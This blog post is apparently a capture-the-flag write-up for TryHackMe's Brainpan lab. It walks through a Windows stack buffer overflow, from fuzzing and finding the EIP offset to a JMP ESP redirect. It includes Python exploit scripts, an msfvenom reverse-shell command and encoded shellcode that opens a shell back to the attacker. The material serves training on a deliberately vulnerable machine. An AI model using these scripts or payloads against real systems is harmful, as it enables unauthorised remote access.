---
title: "BrainPan-Tryhackme"
author: "Trevor saudi"
date: 2021-04-05T18:46:03.757Z
lastmod: 2022-05-24T14:31:47+03:00

description: ""

subtitle: "Exploit a buffer overflow vulnerability by analyzing a Windows executable."

image: "/posts/2021-04-05_brainpantryhackme/images/1.png" 
images:
 - "/posts/2021-04-05_brainpantryhackme/images/1.png"
 - "/posts/2021-04-05_brainpantryhackme/images/2.png"
 - "/posts/2021-04-05_brainpantryhackme/images/3.png"
 - "/posts/2021-04-05_brainpantryhackme/images/4.png"
 - "/posts/2021-04-05_brainpantryhackme/images/5.png"
 - "/posts/2021-04-05_brainpantryhackme/images/6.png"
 - "/posts/2021-04-05_brainpantryhackme/images/7.png"
 - "/posts/2021-04-05_brainpantryhackme/images/8.png"
 - "/posts/2021-04-05_brainpantryhackme/images/9.png"
 - "/posts/2021-04-05_brainpantryhackme/images/10.png"
 - "/posts/2021-04-05_brainpantryhackme/images/11.png"
 - "/posts/2021-04-05_brainpantryhackme/images/12.png"
 - "/posts/2021-04-05_brainpantryhackme/images/13.png"
 - "/posts/2021-04-05_brainpantryhackme/images/14.png"
 - "/posts/2021-04-05_brainpantryhackme/images/15.png"
 - "/posts/2021-04-05_brainpantryhackme/images/16.png"
 - "/posts/2021-04-05_brainpantryhackme/images/17.png"
 - "/posts/2021-04-05_brainpantryhackme/images/18.png"
 - "/posts/2021-04-05_brainpantryhackme/images/19.png"


aliases:
    - "/brainpan-tryhackme-ced123611c56"


tags:
- Machine
- BOF
---

![image](/posts/2021-04-05_brainpantryhackme/images/1.png#layoutTextWidth)


## Exploiting a buffer overflow vulnerability by analyzing a Windows executable.

### Enumeration

Perform a quick rustscan to view open ports.

![image](/posts/2021-04-05_brainpantryhackme/images/2.png#layoutTextWidth)


Port our results to nmap.

![image](/posts/2021-04-05_brainpantryhackme/images/3.png#layoutTextWidth)


Not much information but I tried opening them on my browser. Port 9999 gave nothing but 10000 opens up a website as shown below.

![image](/posts/2021-04-05_brainpantryhackme/images/4.png#layoutTextWidth)


I bruteforced for some directories and found something interesting.

![image](/posts/2021-04-05_brainpantryhackme/images/5.png#layoutTextWidth)


This directory contains an executable file which is the application running on port 9999.

![image](/posts/2021-04-05_brainpantryhackme/images/6.png#layoutTextWidth)


Trying a netcat to port 9999. We get this password prompt.

![image](/posts/2021-04-05_brainpantryhackme/images/7.png#layoutTextWidth)


### Fuzzing

We are working with a buffer overflow, so let us trying crashing the application running on port 9999

![image](/posts/2021-04-05_brainpantryhackme/images/8.png#layoutTextWidth)


We indeed get a crashing confirming existence of a buffer overflow.

Download the executable file and transfer it to your Windows VM. We will work with Immunity debugger.

Run the application and try connecting to it using our VM’s IP.

![image](/posts/2021-04-05_brainpantryhackme/images/9.png#layoutTextWidth)


We can test the connection using netcat. We get the connection back. Everything set up, let’s get hacking :)

![image](/posts/2021-04-05_brainpantryhackme/images/10.png#layoutTextWidth)


#### Step 1: Finding the size of the crash

We need to find the approximate number of bytes that crashed our application. Attach it to immunity debugger and we can write a python script to send some bytes to the application till it crashes.

```python3
import socket


IP = "192.168.100.85"
PORT = 9999
s = socket.socket()
s.connect((IP,PORT))

buffer = [
    b"A"*100
]

buffer = b"".join(buffer)
while True:
    s.send(buffer)
    buffer = buffer + b"A"*100
```


Head over to immunity debugger and see that our application crashed

![image](/posts/2021-04-05_brainpantryhackme/images/11.png#layoutTextWidth)


To calculate the size of the crash, right click on esp , follow in dump. Check the address where the As start and end

![image](/posts/2021-04-05_brainpantryhackme/images/12.png#layoutTextWidth)


We get 2072. We will use this as the default length of bytes.

Modify our script as follows.

```python3
import socket


IP = "192.168.100.85"
PORT = 9999
s = socket.socket()
s.connect((IP,PORT))

total_length = 2072

buffer = [
    b"A"*total_length
]

buffer = b"".join(buffer)
s.send(buffer)
```

#### Step 2: Finding the offset

Next we need to find out the exact number of bytes within the total_length that actually cause the crash. We use msf pattern create and pattern offset.
`/usr/bin/msf-pattern_create -l 2072`

Copy the result and modify our script as follows
```python3
import socket


IP = "192.168.100.85"
PORT = 9999
s = socket.socket()
s.connect((IP,PORT))

total_length = 2072

buffer = [
    b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr"
]

buffer = b"".join(buffer)
s.send(buffer)

```

Run the script and note the value of the EIP
```bash
/usr/bin/msf-pattern_offset -l 2072 -q 35724134                         
[*] Exact match at offset 524
```

We get our offset at 524. This means we have exactly 524 bytes before we reach the EIP register

#### Step 3: Controlling the EIP

We modify our script as follows and observe the EIP register

```python3
import socket


IP = "192.168.100.85"
PORT = 9999
s = socket.socket()
s.connect((IP,PORT))

total_length = 2072
offset = 524
buffer = [
    b"A" * offset,
    b"B" * 4
]

buffer = b"".join(buffer)
s.send(buffer)
```

We try controlling the EIP with 4Bs and get the ascii value for B as 42424242 on the EIP register.

![image](/posts/2021-04-05_brainpantryhackme/images/13.png#layoutTextWidth)


We have control over the EIP.

#### Step 4: Finding the bad characters

We need to determine the characters that brainpan does not like. This will help us create our payload without the bad characters.

I like to use the struct inbuilt module with list comprehension. Modify your script as follows and send the bad characters.

```python3
import socket
from struct import pack

bad_chars = b"".join([pack("<B",x) for x in range(1,256)])


IP = "192.168.100.85"
PORT = 9999
s = socket.socket()
s.connect((IP,PORT))

total_length = 2072
offset = 524
buffer = [
    bad_chars,
    b"A" * (total_length - len(bad_chars)),
]

buffer = b"".join(buffer)
s.send(buffer)
```

We can observe the characters in the hex dump and see if we get any bad ones. Luckily for us there are no bad characters here.

![image](/posts/2021-04-05_brainpantryhackme/images/14.png#layoutTextWidth)


#### Step 5: Finding a JMP ESP instruction

We need to find a JMP ESP instruction that will take us to the top of the stack. We will use this JMP ESP as the new EIP so that we hijack the control flow of the program.

We can use the mona module
`!mona jmp -r esp `

We get an address that points to a jmp esp instruction `0x311712F3`

![image](/posts/2021-04-05_brainpantryhackme/images/15.png#layoutTextWidth)


Set a breakpoint at that instruction. Ctrl+G , enter the address value then press enter and set breakpoint.

![image](/posts/2021-04-05_brainpantryhackme/images/16.png#layoutTextWidth)


Modify our script as follows and observe that we hit the breakpoint,
```python3
import socket
from struct import pack

bad_chars = b"".join([pack("<B",x) for x in range(1,256)])


IP = "192.168.100.85"
PORT = 9999
s = socket.socket()
s.connect((IP,PORT))

total_length = 2072
offset = 524
new_eip = pack("<I",0x311712F3)
buffer = [
    
    b"A" * offset,
    new_eip,
    b"C" * (total_length-offset)
]

buffer = b"".join(buffer)
s.send(buffer)
```


step through the code using f7 and observe how we get redirected to the top of the stack

![image](/posts/2021-04-05_brainpantryhackme/images/17.png#layoutTextWidth)


#### Step 6: Generating shellcode

Now we can generate shellcode to get a reverse shell on our program
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=wlan0 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"
```

Modify our script and send the payload while listening on port 4444

![image](/posts/2021-04-05_brainpantryhackme/images/18.png#layoutTextWidth)


Sweet :) Our exploit worked. Now recreate the shellcode but with tun0 for tryhackme local IP. Change the IP in the script to the remote IP


```python3
import socket
from struct import pack

# bad_chars = b"".join([pack("<B",x) for x in range(1,256)])
IP = "10.10.255.160"
PORT = 9999
buf =  b""
buf += b"\xdb\xd4\xba\x70\xb3\xd8\x55\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x52\x83\xc3\x04\x31\x53\x13\x03\x23\xa0\x3a"
buf += b"\xa0\x3f\x2e\x38\x4b\xbf\xaf\x5d\xc5\x5a\x9e\x5d\xb1"
buf += b"\x2f\xb1\x6d\xb1\x7d\x3e\x05\x97\x95\xb5\x6b\x30\x9a"
buf += b"\x7e\xc1\x66\x95\x7f\x7a\x5a\xb4\x03\x81\x8f\x16\x3d"
buf += b"\x4a\xc2\x57\x7a\xb7\x2f\x05\xd3\xb3\x82\xb9\x50\x89"
buf += b"\x1e\x32\x2a\x1f\x27\xa7\xfb\x1e\x06\x76\x77\x79\x88"
buf += b"\x79\x54\xf1\x81\x61\xb9\x3c\x5b\x1a\x09\xca\x5a\xca"
buf += b"\x43\x33\xf0\x33\x6c\xc6\x08\x74\x4b\x39\x7f\x8c\xaf"
buf += b"\xc4\x78\x4b\xcd\x12\x0c\x4f\x75\xd0\xb6\xab\x87\x35"
buf += b"\x20\x38\x8b\xf2\x26\x66\x88\x05\xea\x1d\xb4\x8e\x0d"
buf += b"\xf1\x3c\xd4\x29\xd5\x65\x8e\x50\x4c\xc0\x61\x6c\x8e"
buf += b"\xab\xde\xc8\xc5\x46\x0a\x61\x84\x0e\xff\x48\x36\xcf"
buf += b"\x97\xdb\x45\xfd\x38\x70\xc1\x4d\xb0\x5e\x16\xb1\xeb"
buf += b"\x27\x88\x4c\x14\x58\x81\x8a\x40\x08\xb9\x3b\xe9\xc3"
buf += b"\x39\xc3\x3c\x43\x69\x6b\xef\x24\xd9\xcb\x5f\xcd\x33"
buf += b"\xc4\x80\xed\x3c\x0e\xa9\x84\xc7\xd9\xdc\x5a\xee\xb8"
buf += b"\x89\x58\xf0\xab\x15\xd4\x16\xa1\xb5\xb0\x81\x5e\x2f"
buf += b"\x99\x59\xfe\xb0\x37\x24\xc0\x3b\xb4\xd9\x8f\xcb\xb1"
buf += b"\xc9\x78\x3c\x8c\xb3\x2f\x43\x3a\xdb\xac\xd6\xa1\x1b"
buf += b"\xba\xca\x7d\x4c\xeb\x3d\x74\x18\x01\x67\x2e\x3e\xd8"
buf += b"\xf1\x09\xfa\x07\xc2\x94\x03\xc5\x7e\xb3\x13\x13\x7e"
buf += b"\xff\x47\xcb\x29\xa9\x31\xad\x83\x1b\xeb\x67\x7f\xf2"
buf += b"\x7b\xf1\xb3\xc5\xfd\xfe\x99\xb3\xe1\x4f\x74\x82\x1e"
buf += b"\x7f\x10\x02\x67\x9d\x80\xed\xb2\x25\xb0\xa7\x9e\x0c"
buf += b"\x59\x6e\x4b\x0d\x04\x91\xa6\x52\x31\x12\x42\x2b\xc6"
buf += b"\x0a\x27\x2e\x82\x8c\xd4\x42\x9b\x78\xda\xf1\x9c\xa8"

shellcode = buf

s = socket.socket()
s.connect((IP,PORT))
s.recv(1024)

total_length = 2072
offset = 524
nop_sled = b"\x90"*16
new_eip = pack("<I",0x311712F3)
buffer = [
    
    b"A" * offset,
    new_eip,
    nop_sled,
    shellcode,
    b"C" * (total_length-offset-len(shellcode)-len(nop_sled)-len(shellcode))
]

buffer = b"".join(buffer)
s.send(buffer)
```

We get a shell :)

![image](/posts/2021-04-05_brainpantryhackme/images/19.png#layoutTextWidth)


Happy hacking :)
